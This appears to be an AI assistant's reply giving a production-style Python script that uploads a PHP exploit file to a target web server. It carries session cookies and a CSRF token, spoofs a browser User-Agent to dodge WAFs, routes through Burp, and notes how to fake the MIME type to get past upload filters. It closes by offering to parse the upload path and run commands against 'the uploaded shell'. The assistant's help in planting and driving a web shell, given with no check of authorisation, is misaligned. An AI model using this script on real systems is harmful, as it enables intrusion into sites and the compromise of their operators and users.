To handle authentication or custom headers inside your Python upload session, you need to expand the script to pass a headers or cookies dictionary into the requests.post() function. This ensures the target server recognizes your session as valid.
Here is the updated, production-ready Python script showing how to include cookies, custom headers, and multi-part bypass configurations:
python
import requests
# Suppress SSL certificate warnings caused by routing traffic through Burp Suite
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 1. Target Configuration
target_url = "https://target.com"  
file_to_upload = "exploit.php"

# 2. Authentication and Custom Headers
# Copy these values directly from an active session inside your Burp Suite HTTP History
cookies = {
    "session": "abc123xyz789cookievalue",
    "user_id": "42"
}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "X-XSRF-TOKEN": "anti-csrf-token-here", # Include if the app requires a CSRF token
    "Referer": "https://target.com"
}

# 3. Inline Proxy Configuration (Routes through Burp Suite)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# 4. Read File Content and Structure Multipart Payload
try:
    with open(file_to_upload, 'rb') as f:
        # Tuple format: (filename, data, content_type)
        # You can alter "application/x-php" to "image/jpeg" here to bypass MIME-type filters
        files = {
            "avatar": (file_to_upload, f.read(), "application/x-php")
        }
        
    print(f"[*] Dispatching exploit sequence to {target_url}...")
    
    # 5. Execute Request
    response = requests.post(
        target_url, 
        files=files, 
        headers=headers, 
        cookies=cookies, 
        proxies=proxies, 
        verify=False
    )
    
    # 6. Output Target Execution Context
    print(f"[+] HTTP Status Code: {response.status_code}")
    print("[+] Server Response Document:\n")
    print(response.text)

except FileNotFoundError:
    print(f"[-] Operational Failure: Looked for '{file_to_upload}' but it does not exist locally.")
Use code with caution.

Key Elements of this Session Structure:

* cookies=cookies: Directly authenticates the script. If the endpoint requires you to be logged in to upload assets, passing this dictionary keeps the session active.
* headers=headers: Mimics a legitimate browser fingerprint. Many modern Web Application Firewalls (WAFs) automatically drop requests that use Python's default User-Agent (python-requests/2.X.X).
* verify=False: Essential when routing through Burp. It prevents Python from throwing an SSL verification crash when encountering Burp Suite's local self-signed authority certificate.
Now that the script can hold session state, let me know:
* Is your target endpoint returning a specific JSON property containing the new file URL path (e.g., {"url":"/static/..."})?
* If it returns the path, I can show you how to program Python to parse that JSON automatically and instantly execute a test command like whoami against the uploaded shell.
